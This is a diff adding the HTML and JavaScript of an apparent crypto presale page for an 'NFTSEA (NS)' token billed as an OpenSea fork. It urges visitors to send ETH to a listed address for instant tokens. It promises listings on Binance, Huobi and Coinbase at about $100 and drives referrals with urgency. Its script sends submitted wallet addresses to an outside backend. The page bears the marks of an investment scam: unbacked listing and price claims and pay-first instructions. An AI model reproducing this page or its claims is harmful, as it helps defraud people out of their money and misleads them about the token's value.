@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="same-origin">
+<link rel="icon" href="assets/logo.png" sizes="16x16">
+<title>NFTSEA</title>
+<link rel="stylesheet" href="assets/libs/bootstrap/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="assets/libs/owl.carousel/dist/assets/owl.carousel.min.css">
+<link rel="stylesheet" href="assets/libs/owl.carousel/dist/assets/owl.theme.default.min.css">
+<link rel="stylesheet" href="assets/libs/progress.js-master/src/progressjs.css">
+<link rel="stylesheet" href="assets/fonts/fonts.css">
+<link rel="stylesheet" href="assets/css/app.css">
+<link rel="stylesheet" href="assets/icofont/icofont.min.css">
+</head>
+<body>
+<div class="loader"></div>
+<div class="main-hero mb-5 mb-md-0">
+<div class="hero-main-inr">
+<div class="nav-otr">
+<div class="container-fluid">
+<div class="nav-inr">
+<div class="burger-menu">
+<a href="index.html#top" class="logo-otr" data-scroll>
+<img class="logo-img align-middle" src="assets/logo.png" alt="brand-logo" style="width:40px">
+<span class="align-middle ms-1" style="color:#000;font-size:24px;font-weight:bold;">NFTSEA</span>
+</a>
+</div>
+<div class="navigation-otr d-none d-sm-block">
+<ul class="navigation-inr d-flex">
+<li class="nav-li me-5">
+<a href="index.html#token" data-scroll class="nav-a body-sb" style="color:#666">Token</a>
+</li>
+<li class="nav-li me-5">
+<a href="index.html#introduce" data-scroll class="nav-a body-sb" style="color:#666">Introduce</a>
+</li>
+<li class="nav-li me-5">
+<a href="index.html#roadmap" data-scroll class="nav-a body-sb" style="color:#666">Roadmap</a>
+</li>
+<li class="nav-li me-5">
+<a href="https://t.me/NStoken" target="_blank" class="nav-a body-sb" style="color:#666">Telegram<i class="icofont-external-link ms-1"></i></a>
+</li>
+</ul>
+</div>
+<div class="language-selector">
+<ul class="language-ul d-flex">
+<li class="language-li position-relative">
+<a class="language-a d-flex align-center px-3 py-1 align-items-center" data-bs-toggle="collapse" href="index.html#lang-collapse" style="border: 1px solid #CFCFCF;border-radius: 16px;color:#666">
+🇬🇧 <p class="body-sb language px-2">English</p>
+<svg class="caret-down" width="12" height="8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 1.5l-5 5-5-5" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
+</a>
+<ul id="lang-collapse" class="drop-ul collapse position-absolute bg-white px-3 py-2 mt-2 shadow w-100" style="border-radius: 16px; z-index:100">
+<li class="drop-li">
+<a href="javascript:;" class="drop-a d-inline-flex align-items-center lang" data-lang="en" style="color:#666">
+🇬🇧 <p class="body-sb language mx-2">English</p>
+</a>
+ </li>
+<li class="drop-li">
+<a href="javascript:;" class="drop-a d-inline-flex align-items-center lang" data-lang="zh" style="color:#666">
+🇨🇳 <p class="body-sb language mx-2">简体中文</p>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="hero-mainn justify-content-center mb-0">
+<div class="container-fluid max-width-1000">
+<div class="hero-inr pt-2">
+<div class="row row-custom">
+<div class="col-12 col-content-otr" style="width:100% !important">
+<div class="col-content-inr">
+<div class="head-otr">
+<h1 class="heading-h1 heading titleGreathorned text-center mt-lg-5">
+NFTSEA (NS) <span>Token Airdrop</span>
+</h1>
+</div>
+<div class="row w-100 flex-row boxes-main justify-content-center">
+<div class="col-sm-8 col-md-7 col-lg-6 auction-main order-md-2 my-2 mx-2 mx-lg-3">
+<p class="body-mb acution">Airdrop Ending</p>
+<div class="timer">
+<div class="hours-main main count_down_days">
+<p class="heading-h2 time-inr number">00</p>
+<p class="hours-p body-mb">Days</p>
+</div>
+<div class="hours-main main count_down_hours">
+<p class="heading-h2 time-inr number">00</p>
+<p class="hours-p body-mb">Hours</p>
+</div>
+<div class="minutes-main main count_down_minutes">
+<p class="heading-h2 time-inr number">00</p>
+<p class="seconds-p body-mb">Mins</p>
+</div>
+<div class="seconds-main main count_down_seconds">
+<p class="heading-h2 time-inr number">00</p>
+<p class="seconds-p body-mb">Secs</p>
+</div>
+</div>
+</div>
+<div class="col-sm-8 col-md-4 col-lg-5 bid-main d-none d-sm-block order-md-1 my-2 mx-2 mx-lg-3">
+<p class="bid body-mb">Pre-sale Price</p>
+<h3 class="heading-h2 bid-head">10,000 NS</h3>
+<p class="dollor body-mb">= 1 ETH</p>
+</div>
+</div>
+<div class="action-otr justify-content-center">
+<a href="index.html#airdrop" data-scroll class="btn-outline2 btn-wallet order-lg-2 my-2 mx-2 mx-lg-3">Airdrop</a>
+<a href="index.html#presale" data-scroll class="btn-fill btn-create order-lg-1 my-2 mx-2 mx-lg-3">Pre-sale</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<img class="shape" src="assets/img/svg/home2-shape.svg" alt="shape">
+</div>
+</div>
+<div id="token" class="call-to-action-home2 justify-content-center my-5">
+<div class="container-fluid">
+<div class="call-to-action p-4 p-md-5 mb-3 text-shadow">
+<div class="wrapper row">
+<div class="col-lg-7 col-xl-6">
+<h2 class="heading-h2 heading">About NFTSEA</h2>
+<p class="text-muted body-m mb-2">NFTSEA is a fork of OPENSEA. It aims to eliminate the inherent flaws of OPENSEA, simplify the user threshold, provide cross-blockchain support, and provide lower rates to improve the NFT ecosystem and become the largest, lowest rate, and most comprehensive cross-blockchain NFT marketplace. NFTSEA will be community driven and governed, and the core members of the community are composed of top investors in the NFT field. NFTSEA is not affiliated with OPENSEA, but we thank them for their contributions to the development of the NFT field. </p>
+<p class="text-muted body-m mb-2">NS is the governance token of NFTSEA, with a total issuance of only 3,000,000. It is intended to create a high-priced coin to attract popularity! 20% of NS tokens for community airdrop, and distributed to community users for free. 60% of NS tokens for pre-sale, and the pre-sale price is 1 ETH = 10,000 NS. After the pre-sale ends, NS will be listed on exchanges such as Binance, Huobi and Coinbase. The estimated listing price of NS is $100.</p>
+<h2 class="heading-h4">Smart Contract</h2>
+<ul>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-star text-primary"></i>
+<span class="text-muted mx-2">Token Symbol</span>
+<span class="text-primary">NS</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-truck-loaded text-primary"></i>
+<span class="text-muted mx-2 text-nowrap">Contract Address</span>
+<span class="text-primary text-break copy">0x5b31B8cA1770CF1F817146B4cD2078Bf8629bf8a</span>
+<a href="https://etherscan.io/token/0x5b31B8cA1770CF1F817146B4cD2078Bf8629bf8a" target="_blank" class="ms-2"><i class="icofont-external-link text-primary"></i></a>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-bullhorn text-primary"></i>
+<span class="text-muted mx-2">Decimals</span>
+<span class="text-primary">18</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-box text-primary"></i>
+<span class="text-muted mx-2">Total Supply</span>
+<span class="text-primary">3,000,000</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-globe text-primary"></i>
+<span class="text-muted mx-2">Blockchain</span>
+<span class="text-primary">Ethereum ERC20</span>
+</li>
+</ul>
+<a href="whitepaper.pdf" target="_blank" class="btn btn-outline2 mt-2">Whitepaper</a>
+</div>
+</div>
+<div class="img-otr">
+<div class="img-inr">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/4.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/5.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/6.png" alt="img">
+</div>
+</div>
+<div class="img-inr">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/7.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/8.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/9.png" alt="img">
+</div>
+</div>
+<div class="img-inr d-none d-xl-block">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/1.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/3.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="assets/img/2.png" alt="img">
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="presale" class="live-acution-home2 justify-content-center" style="padding:30px 0 50px 0 !important;">
+<div class="container-fluid max-width-1000">
+<div class="live-auction-inr">
+<div class="heading-otr">
+<div class="head-otr">
+<span class="dot"></span>
+<h3 class="heading heading-h3">Pre-sale is Live</h3>
+</div>
+</div>
+<span class="line"></span>
+<div>
+<p class="mb-2">
+Pre-sale supply: 1,800,000
+</p>
+<p class="mb-2">Pre-sale address: <span class="text-primary copy text-break">0x6182f213A6904Df9451E00e6F7716D95a39AFaFB</span> <a class="copy d-inline-block" text="0x6182f213A6904Df9451E00e6F7716D95a39AFaFB" href="javascript:;"><i class="icofont-ui-copy"></i></a></p>
+<p class="mb-2">Pre-sale price: 1 ETH = 10,000 NS</p>
+<p class="mb-2">
+Use your wallet to send ETH to the Pre-sale address. Our system will send NS tokens to your wallet instantly.
+</p>
+<p class="mb-2">
+The minimum purchase is 0.1 ETH, and the maximum purchase is 10 ETH.
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="airdrop" class="work-main-home2 justify-content-center" style="background-image:url('assets/img/svg/footer-circles2.svg');background-repeat: no-repeat;background-position: top left;">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">Airdrop</h3>
+</div>
+<div id="airdrop-block" class="row row-work justify-content-center">
+<div class="col-12 col-sm-10 col-md-9 col-lg-8">
+<form id="airdrop-form" data-lpignore="true">
+<input name="ref" type="hidden" value="">
+<div class="input-group">
+<input name="address" id="inputAirdrop" class="input form-control" type="text" placeholder="Input your ETH address">
+<button type="submit" id="submitAirdrop" class="btn btn-fill py-2">Submit</button>
+</div>
+</form>
+</div>
+<div id="airdrop-modal" class="modal" tabindex="-1" style="display: none;" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+    <div class="modal-content">
+    <div class="modal-header">
+    <h5 class="modal-title">Prompt</h5>
+    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+    </div>
+    <div class="modal-body">
+    <p class="text-muted">Incorrect ETH address</p>
+    </div>
+    </div>
+    </div>
+</div>
+</div>
+</div>
+</div>
+<div id="introduce" class="work-main-home2 justify-content-center" style="background-image:url('assets/img/svg/footer-circles1.svg');background-repeat: no-repeat;background-position: bottom right;">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">Introduce</h3>
+</div>
+<div class="row-work justify-content-center">
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+ <div class="heading-h4">Community airdrop</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+Quantity: Quantity: 600,000 NS (20%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Airdrop rules: NFTSEA will start community airdrop at 20:30 (UTC+8) on October 04, 2021, and the airdrop time is 30 days. Community users can participate in the airdrop by submitting the ETH wallet address on the NFTSEA website. The initial amount of each address is 10 NS. The airdrop is completely free, and the airdrop rewards will be distributed to the submitted address after the airdrop is over. Airdrop participation addresses are estimated to be 100,000. If the total airdrop award exceeds the quantity for airdrop, the airdrop event will end early. If there are still unclaimed NS tokens after the airdrop ends, the unclaimed part will be permanently destroyed.
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Invitation rules: Users can get additional NS token rewards by inviting friends to participate in the airdrop. You can get 10 NS tokens for each friend you invite. You can invite up to 50 friends, and get up to 500 NS tokens. The quantity for airdrop is limited, and NS issuance is small. The estimated price of NS is $100. Hurry up and share it with your friends.
+</li>
+</ul>
+</div>
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+<div class="heading-h4">Pre-sale</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+Pre-sale quantity: 1,800,000 NS (60%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Pre-sale price: 1 ETH = 10,000 NS. The minimum purchase is 0.1 ETH, and the maximum purchase is 10 ETH (the pre-sale quantity is limited, and the excess ETH will be automatically returned).
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Pre-sale rules: The system will start the pre-sale at 20:30 (UTC+8) on October 04, 2021, and the pre-sale time is 30 days. Use your wallet to send ETH to the pre-sale address, and the system will immediately send the corresponding amount of NS tokens to your wallet. The quantity of NS tokens for pre-sale is limited, and the quota is sorted according to the arrival time of ETH. First come first served.
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Once the pre-sale is over. 50% of the funds raised will be used for listing on Binance, Huobi and Coinbase. The other 50% of the funds raised will be used to buyback NS tokens. This action will prevent people from dumping.
+</li>
+</ul>
+</div>
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+<div class="heading-h4">NFTSEA(NS) Tokenomics</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+Total supply: 3,000,000 NS
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Community airdrop: 600,000 NS (20%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Pre-sale: 1,800,000 NS (60%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+Future development: 600,000 NS (20%)
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div id="roadmap" class="work-main-home2">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">Roadmap</h3>
+</div>
+<div class="row-work">
+<div class="text-muted">Phase 1</div>
+<div class="heading-h4">October 2021</div>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+Official website launched & smart contract deployed
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+Social media sites (twitter, telegram, etc.) launched
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+Pre-sale & airdrop started
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+Developing the NFT platform
+</p>
+</div>
+<div class="row-work mt-4 offset-md-1">
+<div class="text-muted">Phase 2</div>
+<div class="heading-h4">November 2021</div>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Pre-sale completed
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Airdrop distribution completed
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+NS listed on binance, huobi and coinbase exchanges
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Buyback NS tokens
+</p>
+</div>
+<div class="row-work mt-4 offset-md-2">
+<div class="text-muted">Phase 3</div>
+<div class="heading-h4">December 2021</div>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+NFT platform launched
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Artists and high-quality projects settled in the platform
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Start large-scale marketing online
+</p>
+ </div>
+<div class="row-work mt-4 offset-md-3">
+<div class="text-muted">Phase 4</div>
+<div class="heading-h4">2022</div>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Become the Largest, Lowest rate, and most comprehensive cross-blockchain NFT marketplace
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+Start the Metaverse project
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">></span>
+More functions, more activities in planning
+</p>
+</div>
+</div>
+</div>
+<div class="footer-home2 pt-4 pb-0">
+<div class="container-fluid">
+<div class="wrapper pb-4 justify-content-start">
+<h4 class="heading-h4 ethoz-head me-md-4">
+Get Latest Updated from NFTSEA
+</h4>
+<ul class="icon-ul">
+<li class="icon-li">
+<a href="https://t.me/NStoken" target="_blank" class="icon-a">
+<svg class="icon" width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 16.859l11.24 9.89a1 1 0 001.635-.527l4.702-20.516a1 1 0 00-1.34-1.154l-23.07 9.063a1 1 0 00.17 1.911L11 16.86zM11 16.86L28.014 4.57" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /><path d="M16.613 21.799l-3.906 3.906A1 1 0 0111 24.998v-8.14" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
+</a>
+</li>
+<li class="icon-li">
+<a href="https://twitter.com/NFTSEAofficial" target="_blank" class="icon-a">
+<svg class="icon" width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6 25s5-1 6-4c0 0-8-3-6-14 0 0 4 5 10 6v-2a5 5 0 019.584-2H30l-4 4c0 7-5 14-14 14-4 0-6-2-6-2z" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
+</a>
+</li>
+</ul>
+</div>
+</div>
+<img class="shape1" src="assets/img/Squares-shape2-home2.svg" alt="Squares">
+<img class="shape2" src="assets/img/Squares-shape1-home2.svg" alt="Squares">
+</div>
+<div class="copy-otr-home2">
+<div class="container-fluid">
+<div class="copy-inr">
+<a href="index.html#top" class="logo-otr">
+<img class="logo" src="assets/logo.png" alt="brand-logo" style="height:30px;width:30px;">
+</a>
+<div class="copy-name body-s">
+Copyright © 2021 by NFTSEA
+</div>
+<div class="all-rights">
+<p class="all body-s">
+All rights reserved.
+</p>
+</div>
+</div>
+</div>
+</div>
+<script src="assets/libs/jquery/dist/jquery.min.js"></script>
+<script src="assets/libs/jquery.countdown/jquery.countdown.js"></script>
+<script src="assets/libs/tilt.js/dest/tilt.jquery.min.js"></script>
+<script src="assets/libs/owl.carousel/dist/owl.carousel.min.js"></script>
+<script src="assets/libs/progress.js-master/src/progress.js"></script>
+<script src="assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+<script src="assets/js/smooth-scroll.polyfills.min.js"></script>
+<script src="assets/js/clipboard.min.js"></script>
+<script src="assets/js/js.cookie.min.js"></script>
+<script src="assets/js/encrypt.js"></script>
+<script src="assets/js/app.js"></script>
+<script>
+    const PATH = window.location.pathname.slice(1, window.location.pathname.length)
+    
+    $("#submitAirdrop").click(async function(){
+        let airDropAddress = $("#inputAirdrop").val()
+        const check_address = await fetch(`http://nftsea.pythonanywhere.com/is-address-valid?address=${airDropAddress}`)
+        let queryResponse = await check_address.json();
+        
+        if(queryResponse.addressValid){
+            if(!PATH) PATH = "None"
+            const send = await fetch(`http://nftsea.pythonanywhere.com/ref/${PATH}`, {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({address: airDropAddress })
+            });
+            
+            let response = await send.json();
+
+            if(response){
+                localStorage.setItem("address", airDropAddress)
+                $("#airdrop-block").empty()
+                $("#airdrop-block").html(`
+                    <div class="col-12 col-sm-10 col-md-9 col-lg-8">
+                        <div id="airdrop-modal" class="modal" tabindex="-1" style="display: none;" aria-hidden="true">
+                        <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                        <div class="modal-header">
+                        <h5 class="modal-title">Prompt</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        </div>
+                        <div class="modal-body">
+                        <p class="text-muted">Incorrect ETH address</p>
+                        </div>
+                        </div>
+                        </div>
+                    </div>
+                    <div class="text-break">
+                    <span class="me-3"><b>Refer Link:</b></span>
+                    <span class="text-primary copy" text="https://nftsea.net/${response.referral_code} ">https://nftsea.net/${response.referral_code}</span>
+                    <a class="copy d-inline-block" text="https://nftsea.net/${response.referral_code} " href="javascript:;"><i class="icofont-ui-copy"></i></a>
+                    </div>
+                    <div class="mt-1 text-muted">
+                    Copy and share your refer link, you and the invitee will be rewarded 10 NS at the same time, each person can invite up to 50 people, and the reward can be up to 500 NS tokens.
+                    </div>
+                    <div class="row mt-4 text-center justify-content-between">
+                    <div class="col-3">
+                    <div class="heading-h5"><span class="text-primary">${response.balance}</span> NS</div>
+                    <div class="text-muted">Balance</div>
+                    </div>
+                    <div class="col-3">
+                    <div class="heading-h5 text-primary">${response.referral_count}</div>
+                    <div class="text-muted">Referred</div>
+                    </div>
+                    <div class="col-3">
+                    <div class="heading-h5"><span class="text-primary">${response.rewards}</span> NS</div>
+                    <div class="text-muted">Rewards</div>
+                    </div>
+                    <div class="col-12 col-sm-3 d-flex justify-content-around pt-3 pt-sm-0">
+                    <button id="withdraw" data-address="${response.address}" class="btn btn-fill">Withdraw</button>
+                    <a href="https://t.me/NStoken" target="_blank" class="btn btn-sm btn-outline2 d-sm-none">Telegram</a>
+                    </div>
+                    </div>
+                    </div>
+                    <div class="col-12">
+                    <div class="me-3 mt-5 mb-3"><b>Withdraw History:</b></div>
+                    <table class="table">
+                    <thead>
+                    <tr><td>Time</td>
+                    <td class="d-none d-sm-block">Address</td>
+                    <td>Amount</td>
+                    <td>Status</td>
+                    </tr></thead>
+                    <tbody>
+                    </tbody>
+                    </table>
+                    </div>
+                `)
+
+                $("#withdraw").click(async function(){
+                    let address = $(this).attr("data-address")
+                    
+                    const withdraw = await fetch(`http://nftsea.pythonanywhere.com/withdraw`, {
+                        method: 'POST',
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({address: address })
+                    });
+                    
+                    let response = await withdraw.json();
+                    
+                    if(response){
+                        document.getElementsByClassName("modal-body")[0].getElementsByClassName("text-muted")[0].innerText = response.msg
+                        $('#airdrop-modal').modal('show');
+                    }  
+                    
+                })
+            }
+        }
+        else{
+            document.getElementsByClassName("modal-body")[0].getElementsByClassName("text-muted")[0].innerText = "Incorrect ETH address"
+            $('#airdrop-modal').modal('show');
+        }
+    })  
+
+    async function populateData(airDropAddress){ 
+        const check_address = await fetch(`http://nftsea.pythonanywhere.com/is-address-valid?address=${airDropAddress}`)
+        let queryResponse = await check_address.json();
+        
+        if(queryResponse.addressValid){
+            const send = await fetch(`http://nftsea.pythonanywhere.com/ref/${PATH}`, {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({address: airDropAddress })
+            });
+            
+            let response = await send.json();
+
+            if(response){
+                $("#airdrop-block").empty()
+                $("#airdrop-block").html(`
+                    <div class="col-12 col-sm-10 col-md-9 col-lg-8">
+                        <div id="airdrop-modal" class="modal" tabindex="-1" style="display: none;" aria-hidden="true">
+                        <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                        <div class="modal-header">
+                        <h5 class="modal-title">Prompt</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        </div>
+                        <div class="modal-body">
+                        <p class="text-muted">Incorrect ETH address</p>
+                        </div>
+                        </div>
+                        </div>
+                    </div>
+                    <div class="text-break">
+                    <span class="me-3"><b>Refer Link:</b></span>
+                    <span class="text-primary copy" text="https://nftsea.net/${response.referral_code} ">https://nftsea.net/${response.referral_code}</span>
+                    <a class="copy d-inline-block" text="https://nftsea.net/${response.referral_code} " href="javascript:;"><i class="icofont-ui-copy"></i></a>
+                    </div>
+                    <div class="mt-1 text-muted">
+                    Copy and share your refer link, you and the invitee will be rewarded 10 NS at the same time, each person can invite up to 50 people, and the reward can be up to 500 NS tokens.
+                    </div>
+                    <div class="row mt-4 text-center justify-content-between">
+                    <div class="col-3">
+                    <div class="heading-h5"><span class="text-primary">${response.balance}</span> NS</div>
+                    <div class="text-muted">Balance</div>
+                    </div>
+                    <div class="col-3">
+                    <div class="heading-h5 text-primary">${response.referral_count}</div>
+                    <div class="text-muted">Referred</div>
+                    </div>
+                    <div class="col-3">
+                    <div class="heading-h5"><span class="text-primary">${response.rewards}</span> NS</div>
+                    <div class="text-muted">Rewards</div>
+                    </div>
+                    <div class="col-12 col-sm-3 d-flex justify-content-around pt-3 pt-sm-0">
+                    <button id="withdraw" data-address="${response.address}" class="btn btn-fill">Withdraw</button>
+                    <a href="https://t.me/NStoken" target="_blank" class="btn btn-sm btn-outline2 d-sm-none">Telegram</a>
+                    </div>
+                    </div>
+                    </div>
+                    <div class="col-12">
+                    <div class="me-3 mt-5 mb-3"><b>Withdraw History:</b></div>
+                    <table class="table">
+                    <thead>
+                    <tr><td>Time</td>
+                    <td class="d-none d-sm-block">Address</td>
+                    <td>Amount</td>
+                    <td>Status</td>
+                    </tr></thead>
+                    <tbody>
+                    </tbody>
+                    </table>
+                    </div>
+                `)
+
+                $("#withdraw").click(async function(){
+                    let address = $(this).attr("data-address")
+                    
+                    const withdraw = await fetch(`http://nftsea.pythonanywhere.com/withdraw`, {
+                        method: 'POST',
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({address: address })
+                    });
+                    
+                    let response = await withdraw.json();
+                    
+                    if(response){
+                        document.getElementsByClassName("modal-body")[0].getElementsByClassName("text-muted")[0].innerText = response.msg
+                        $('#airdrop-modal').modal('show');
+                    }  
+                    
+                })
+            }
+        }
+    }
+
+    let addressExist = localStorage.getItem("address")
+    if(addressExist){
+        populateData(addressExist)
+    }
+</script>
+<script>
+(function(){
+    $('a.lang').click(function () {
+        Cookies.set('lang', $(this).attr('data-lang'), { expires: 365, sameSite: 'strict' })
+        location.reload();
+    });
+
+    window.init_page = function (selector) {
+    };
+    init_page(document);
+
+    new ClipboardJS('.copy', {
+        text: function (trigger) {
+            var target = $(trigger);
+            if (target.attr('target')) {
+                target = $(target.attr('target'));
+            }
+            return target.attr('text') || target.val() || target.text();
+        }
+    }).on('success', function (event) {
+        var trigger = $(event.trigger);
+        var title_origin = trigger.attr('title');
+        var message = trigger.attr('data-copy-success');
+        trigger.removeAttr('title');
+        trigger.tooltip({
+            title: message ? message : 'Copied',
+            trigger: 'manual',
+        }).tooltip('show');
+        setTimeout(function () {
+            trigger.tooltip('dispose');
+            trigger.attr('title', title_origin);
+        }, 600);
+    }).on('error', function (e) {
+        alert('Copy failed');
+    });
+    $(document).on('click', '#withdraw', function () {
+        var block = $('#airdrop-block');
+        var address = $(this).attr('data-address');
+        block.load('/airdrop/withdraw', {
+            address: address,
+        }, function () {
+            init_page(block);
+        });
+    });
+
+    var end_ts = 1635942600;
+    var prev_days = 0;
+    var prev_hours = 0;
+    var prev_minutes = 0;
+    var prev_seconds = 0;
+    var countdown = function () {
+        var now_ts = Math.floor(new Date().getTime() / 1000);
+        var ts_diff = end_ts - now_ts;
+        if (ts_diff < 0) {
+            return;
+        }
+        if (ts_diff < -3) {
+            clearInterval(interval);
+            location.reload();
+            return;
+        }
+        var days = Math.floor(ts_diff / 60 / 60 / 24);
+        var hours = Math.floor((ts_diff - days * 60 * 60 * 24) / 60 / 60);
+        var minutes = Math.floor((ts_diff - days * 60 * 60 * 24 - hours * 60 * 60) / 60);
+        var seconds = Math.floor(ts_diff - days * 60 * 60 * 24 - hours * 60 * 60 - minutes * 60);
+        if (prev_days != days) {
+            $('.count_down_days .number').text(days);
+        }
+        if (prev_hours != hours) {
+            $('.count_down_hours .number').text(hours);
+        }
+        if (prev_minutes != minutes) {
+            $('.count_down_minutes .number').text(minutes);
+        }
+        $('.count_down_seconds .number').text(seconds);
+        prev_days = days;
+        prev_hours = hours;
+        prev_minutes = minutes;
+        prev_seconds = seconds;
+    };
+    countdown();
+    var interval = setInterval(countdown, 1000);
+
+    $(document).click(function(e) {
+        var collapse=$(".collapse");
+        var target=$(e.target);
+        if(target.attr('data-bs-toggle')=='collapse'){
+        }else if(target.hasClass('collapse')){
+        }else if(target.parents('.collapse').length>0){
+        }else if(collapse.hasClass('show')){
+            collapse.collapse('hide');
+        }
+    });
+    (function(){
+        var selector = '[data-scroll]',
+        fixedHeader = '[data-scroll-header]',
+        scroll = new SmoothScroll(selector, {
+            speed: 700,
+            speedAsDuration: true,
+            offset: 40,
+            header: fixedHeader,
+            updateURL: false
+        });
+    })();
+    (function(){
+        let element = document.querySelector('.btn-scroll-top'),
+        scrollOffset = 600;
+        if (element == null) return;
+        let offsetFromTop = parseInt(scrollOffset, 10);
+        window.addEventListener('scroll', (e) => {
+            if (e.currentTarget.pageYOffset > offsetFromTop) {
+                element.classList.add('show');
+            } else {
+                element.classList.remove('show');
+            }
+        });
+    })();
+})();
+</script>
+<script>
+
